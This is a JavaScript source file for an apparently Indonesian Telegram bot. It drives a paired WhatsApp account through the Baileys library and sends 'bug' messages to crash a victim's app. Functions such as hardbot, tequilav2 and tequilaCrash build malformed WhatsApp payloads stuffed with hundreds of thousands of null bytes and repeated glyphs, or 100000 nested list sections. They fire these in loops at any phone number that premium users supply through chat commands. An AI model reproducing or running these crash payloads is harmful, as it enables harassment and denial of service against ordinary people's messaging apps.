const fs = require("fs");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const P = require("pino");
const chalk = require("chalk");
const global = require("./config.js");
const tdxlol = fs.readFileSync("./tdx.jpeg");
const Boom = require("@hapi/boom");
const TelegramBot = require("node-telegram-bot-api");
const bot = new TelegramBot(global.botToken, { polling: true });
let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));
const owner = global.owner;
const crypto = require("crypto");
const cooldowns = new Map();

console.log(` TEQUILA - CRASH CONNECTED SUCCESSFULLY`);
let Ren;
let whatsappStatus = false;
async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState("session");
  Ren = makeWASocket({
    auth: state,
    logger: P({ level: "silent" }),
    printQRInTerminal: false,
  });

  Ren.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const reason =
        lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
      if (
        reason === DisconnectReason.loggedOut ||
        reason === DisconnectReason.connectionClosed
      ) {
        whatsappStatus = false;
        console.log("Connection closed, deleting session...");
        try {
          await fs.unlinkSync("./session/creds.json");
          await startWhatsapp();
        } catch (err) {
          console.log("Error deleting session:", err);
        }
      } else {
        whatsappStatus = false;
        console.log("Reconnecting...");
        await startWhatsapp();
      }
    } else if (connection === "open") {
      whatsappStatus = true;
      console.log("Connected successfully!");
    }
  });

  Ren.ev.on("creds.update", saveCreds);
}
async function getSessions(bot, chatId, numberTarget) {
  const { state, saveCreds } = await useMultiFileAuthState("session");
  Ren = makeWASocket({
    auth: state,
    logger: P({ level: "silent" }),
    printQRInTerminal: false,
    browser: ["Ubuntu", "Chrome", "24.0.1"],
  });

  Ren.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const reason =
        lastDisconnect?.error?.output?.statusCode || lastDisconnect?.reason;
      if (reason === DisconnectReason.loggedOut) {
        whatsappStatus = false;
        await bot.sendMessage(
          chatId,
          `${numberTarget} Logged out, clearing session...`
        );
        try {
          await fs.unlinkSync("./session/creds.json");
        } catch (err) {
          console.log("Error clearing session:", err);
        }
      } else {
        whatsappStatus = false;
        console.log("Reconnecting...");
        await getSessions(bot, chatId, numberTarget);
      }
    } else if (connection === "open") {
      whatsappStatus = true;
      await bot.sendMessage(
        chatId,
        `${numberTarget} Connected to WhatsApp successfully!`
      );
    }

    if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync("./session/creds.json")) {
          const formattedNumber = numberTarget.replace(/\D/g, "");
          const pairingCode = await Ren.requestPairingCode(formattedNumber);
          const formattedCode =
            pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode;
          bot.sendMessage(
            chatId,
            `
╭━━━━━━━「 CONNECT BOT WA ━━━━━━━━━⬣
│ NOMOR BOT ${numberTarget}
│ KODE PAIRING ${formattedCode}
│ Silakan masukkan kode ini di perangkat yang ditautkan
│ Kode akan kedaluwarsa dalam beberapa menit!
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━⬣`
          );
        }
      } catch (error) {
        bot.sendMessage(
          chatId,
          `Error requesting pairing code: ${error.message}`
        );
      }
    }
  });

  Ren.ev.on("creds.update", saveCreds);
}
function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}
function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}
watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

async function hardbot(target) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            " Hallo, Paket Shopee Anda segera tiba. dengan No Resi NILDAP7262827, Tolong siapkan uang cahs Sebesar Rp 980.500.000. Jika ada pertanyaan, silakan hubungi kami. Terima kasih! " +
            "ꦽ".repeat(45000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: Ren.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "🌸 Tequila Varhalla nih boss ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '- Kami Yo "👋"',
                footerText: "© Tequila Varhalla ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: "🌸 Tequila Varhalla ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: tdxlol,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/devor6core",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! Tequila Varhalla - "𝗋34" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: tdxlol,
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `- Tequila Varhalla 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(
                10
              )}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : Tequila Varhalla ",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Ren.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
  console.log(chalk.green(" Tequila Varhalla : Attacking CrashCursor "));
}

async function tequilav2(target) {
  let sections = [];

  for (let i = 0; i < 100000; i++) {
    let largeText = "ꦾ".repeat(50000);

    let deepNested = {
      title: `Super Deep Nested Section ${i}`,
      highlight_label: `Extreme Highlight ${i}`,
      rows: [
        {
          title: largeText,
          id: `id${i}`,
          subrows: [
            {
              title: "Nested row 1",
              id: `nested_id1_${i}`,
              subsubrows: [
                {
                  title: "Deep Nested row 1",
                  id: `deep_nested_id1_${i}`,
                },
                {
                  title: "Deep Nested row 2",
                  id: `deep_nested_id2_${i}`,
                },
              ],
            },
            {
              title: "Nested row 2",
              id: `nested_id2_${i}`,
            },
          ],
        },
      ],
    };

    sections.push(deepNested);
  }

  let listMessage = {
    title: "Massive Menu Overflow",
    sections: sections,
  };

  let message = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "P",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "JSON.stringify(listMessage)",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "JSON.stringify(listMessage)",
              },
              {
                name: "mpm",
                buttonParamsJson: "JSON.stringify(listMessage)",
              },
              {
                name: "payment_info",
                buttonParamsJson: "JSON.stringify(listMessage)",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "JSON.stringify(listMessage)",
              },
            ],
          },
        },
      },
    },
  };

  await Ren.relayMessage(target, message, {
    participant: { jid: target },
  });
  console.log(chalk.green(" Tequila Varhalla : Attacking InvisiPayload "));
}
async function tequilaCrash(target) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: " Bang Izin Pushkontak 🙏🙏 " + "ꦾ".repeat(55000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: Ren.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "🌸 Tequila Varhalla nih boss ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi",
                },
                contentText: '- Kami Yo "👋"',
                footerText: "© Tequila Varhalla ",
                buttons: [
                  {
                    buttonId:
                      "\u0000".repeat(650000) +
                      "ꦾ".repeat(9000) +
                      "@0".repeat(9000) +
                      "ꦽ".repeat(9000),
                    buttonText: {
                      displayText: "🌸 Tequila Varhalla ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: tdxlol,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/Shinnparker",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '! Tequila Varhalla - "𝗋34" 🩸',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "© running since 2020 to 20##?",
              thumbnail: tdxlol,
              sourceUrl: "go fuck yourself",
              sourceId: "dvx - problem",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `- Tequila Varhalla 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(
                10
              )}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "by : Tequila Varhalla ",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Ren.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
  console.log(chalk.green(" Tequila Varhalla : Attacking Tequila Varhalla "));
}

async function tequilaCrashv2(target) {
  let nomor = target;
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "zZz",
              hasMediaAttachment: false,
            },
            body: {
              text: "Crasher",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await Ren.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

async function crashTequila(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { text: "\u0000" },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "" },
                { name: "call_permission_request", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
                { name: "mpm", buttonParamsJson: "" },
              ],
            },
          },
        },
      },
    };

    await Ren.relayMessage(target, message, { participant: { jid: target } });
  } catch (err) {
    console.log(err);
  }
}
//AWAS

async function BugIos(target) {
  for (let i = 0; i < 5; i++) {
    await hardbot(target);
    await tequilav2(target);
    await tequilav2(target);
    await hardbot(target);
  }
}

//batas
async function punyaren(target) {
  for (let i = 0; i <= 3; i++) {
    await hardbot(target);
    await tequilav2(target);
    await tequilav2(target);
    await hardbot(target);
  }
}

//batasan
async function punyario(target) {
  for (let i = 0; i <= 2; i++) {
    await hardbot(target);
    await tequilaCrashv2(target);
    await tequilaCrashv2(target);
    await hardbot(target);
  }
}

//batasan
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username
    ? `User: @${msg.from.username}`
    : `User ID: ${senderId}`;
  let ligma = ` 
𝙏𝙀𝙌𝙐𝙄𝙇𝘼 𝙑𝘼𝙍𝙃𝘼𝙇𝙇𝘼 𝙑𝟮
👋Hello aku adalah bot telegram yang di ciptakan oleh Tequila Varhalla dan siap membantu masalah mu 
jangan di salah gunakan,segala kejahatan mu bukan tanggung jawab kami!
伊芙琳是一个我真的很爱的美丽女孩💞
━━━━━━━━━━━━━━━━━━━━━
𝘽𝙐𝙂 𝙈𝙀𝙉𝙐
氮 /tequilavarhalla 628xxx ( FC NO CLIK)
氮 /tequilaganteng 628xxx (IOS BUG)
氮 /tequilaantigedor 628xxx (FC CLIK)

𝙊𝙒𝙉𝙀𝙍 𝙈𝙀𝙉𝙐
氮 /addadmin id
氮 /deladmin id
氮 /connect 628xx

𝘼𝘿𝙈𝙄𝙉 𝙈𝙀𝙉𝙐
氮 /addprem id
氮 /delprem id

𝙏𝙌𝙏𝙊
氮 /tqto
━━━━━━━━━━━━━━━━━━━━━
`;
  bot.sendVideo(chatId, "https://files.catbox.moe/8mh9el.mp4", {
    caption: ligma,
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: " Owner 🗿",
            url: "https://t.me/tequilavarhalla",
          },
        ],
      ],
    },
  });
});

bot.onText(/\/tqto/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username
    ? `User: @${msg.from.username}`
    : `User ID: ${senderId}`;
  let ligma = ` 
👋Hello aku adalah bot telegram yang di ciptakan oleh Tequila Varhalla dan siap membantu masalah mu 
jangan di salah gunakan,segala kejahatan mu bukan tanggung an kami
伊芙琳·哈塔巴拉特是一个美丽的女孩💞!
Brikut Adalah Orang orang yang terkait dalam pembuatan secrip ini

𝙏𝙌𝙏𝙊
BIG TAHNKS TO
-MY GOD
-TEQUILA VARHALLA
-PRIMROSE LOTUS ( PATNER )
-JAY RUYIAMA (PATNER)
-SHINPARKER (PATNER)
-REN YURIAMA (PATNER)
-NANIKA (MY SENIOR)
-UNREN (MY SENIOR)
-NATUS VINCERE (BEST FRIEND)
-KEV (BEST FRIEND)

Saya mohon dukungan dan bantuanya kepada kalian
My Telegram : https://t.me/tequilavarhalla
`;
  bot.sendVideo(chatId, "https://files.catbox.moe/8mh9el.mp4", {
    caption: ligma,
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: " Owner 🗿",
            url: "https://t.me/tequilavarhalla",
          },
        ],
      ],
    },
  });
});

bot.onText(/\/connect(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "Only Owner can use this feature")
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Salah Bro\nExample: /connect +628xxxx.");
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");

  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "❌ Salah Bro\nExample: /connect +628xxxx.");
  }

  try {
    await getSessions(bot, chatId, numberTarget);
  } catch (error) {
    console.error("Error in /connect command:", error);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mencoba menyambungkan.");
  }
});
bot.onText(/\/tequilaganteng(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!whatsappStatus) {
    return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
  }
  if (!premiumUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
  }

  const lastUsed = cooldowns.get(senderId);
  const now = Date.now();
  if (lastUsed && now - lastUsed < 300 * 1000) {
    const remainingTime = Math.ceil((300 * 1000 - (now - lastUsed)) / 1000);
    return bot.sendMessage(
      chatId,
      `❌ You must wait ${remainingTime} seconds before using this command again.`
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a target number. Example: /tequilaganteng +628xxxx."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /tequilaganteng +628xxxx."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";
  await BugIos(formatedNumber);
  await bot.sendMessage(
    chatId,
    `Bug Sended To ${numberTarget} Using tequilaganteng`
  );
});
bot.onText(/\/tequilavarhalla(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!whatsappStatus) {
    return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
  }
  if (!premiumUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
  }

  const lastUsed = cooldowns.get(senderId);
  const now = Date.now();
  if (lastUsed && now - lastUsed < 300 * 1000) {
    const remainingTime = Math.ceil((300 * 1000 - (now - lastUsed)) / 1000);
    return bot.sendMessage(
      chatId,
      `❌ You must wait ${remainingTime} seconds before using this command again.`
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a target number. Example: /tequilavarhalla +628xxxx."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /tequilavarhalla +628xxxx."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";
  await punyario(formatedNumber);
  await bot.sendMessage(
    chatId,
    `Bug Sended To ${numberTarget} Using tequilavarhalla`
  );
});
bot.onText(/\/tequilaantigedor(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!whatsappStatus) {
    return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
  }
  if (!premiumUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
  }

  const lastUsed = cooldowns.get(senderId);
  const now = Date.now();
  if (lastUsed && now - lastUsed < 300 * 1000) {
    const remainingTime = Math.ceil((300 * 1000 - (now - lastUsed)) / 1000);
    return bot.sendMessage(
      chatId,
      `❌ You must wait ${remainingTime} seconds before using this command again.`
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a target number. Example: /tequilaantigedor +628xxxx."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /tequilaantigedor +628xxxx."
    );
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";
  await punyario(formatedNumber);
  await bot.sendMessage(
    chatId,
    `Bug Sended To ${numberTarget} Using tequilaantigedor`
  );
});

bot.onText(/\/fix(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;
  if (!whatsappStatus) {
    return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
  }
  if (!premiumUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
  }

  const lastUsed = cooldowns.get(senderId);
  const now = Date.now();
  if (lastUsed && now - lastUsed < 300 * 1000) {
    const remainingTime = Math.ceil((300 * 1000 - (now - lastUsed)) / 1000);
    return bot.sendMessage(
      chatId,
      `❌ You must wait ${remainingTime} seconds before using this command again.`
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a target number. Example: /tequilaantigedor +628xxxx."
    );
  }

  const numberTarget = match[1].replace(/[^0-9]/g, "").replace(/^\+/, "");
  if (!/^\d+$/.test(numberTarget)) {
    return bot.sendMessage(chatId, "❌ Invalid input. Example: /fix +628xxxx.");
  }

  async function fix(numberTarget) {
    let message = {
      extendedTextMessage: {
        text: "test",
      },
    };

    await Ren.relayMessage(numberTarget, message, {});
  }

  const formatedNumber = numberTarget + "@s.whatsapp.net";

  await fix(formatedNumber);
  await bot.sendMessage(chatId, `Bug Sended To ${numberTarget} Using fix`);
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!owner.includes(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to add premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /addprem 7703162727."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /addprem 7703162727."
    );
  }

  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    savePremiumUsers();
    console.log(`${senderId} Added ${userId} To Premium`);
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been added to the premium list.`
    );
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already a premium user.`);
  }
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to add admins.");
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /addadmin 7703162727."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ Invalid input. Example: /addadmin 7703162727."
    );
  }

  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveAdminUsers();
    console.log(`${senderId} Added ${userId} To Admin`);
    bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
  }
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to remove premium users."
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /delprem 7703162727."
    );
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (premiumUsers.includes(userId)) {
    premiumUsers = premiumUsers.filter((id) => id !== userId);
    savePremiumUsers();
    console.log(`${senderId} Deleted ${userId} From Premium`);
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been removed from the premium list.`
    );
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not a premium user.`);
  }
});
bot.onText(/\/deladmin(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId)) {
    return bot.sendMessage(
      chatId,
      "❌ You are not authorized to remove admins."
    );
  }
  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      "❌ Missing input. Please provide a user ID. Example: /deladmin 7703162727."
    );
  }
  const userId = parseInt(match[1].replace(/[^0-9]/g, ""));
  if (adminUsers.includes(userId)) {
    adminUsers = adminUsers.filter((id) => id !== userId);
    saveAdminUsers();
    console.log(`${senderId} Deleted ${userId} From Admin`);
    bot.sendMessage(
      chatId,
      `✅ User ${userId} has been removed from the admin list.`
    );
  } else {
    bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
  }
});
startWhatsapp();
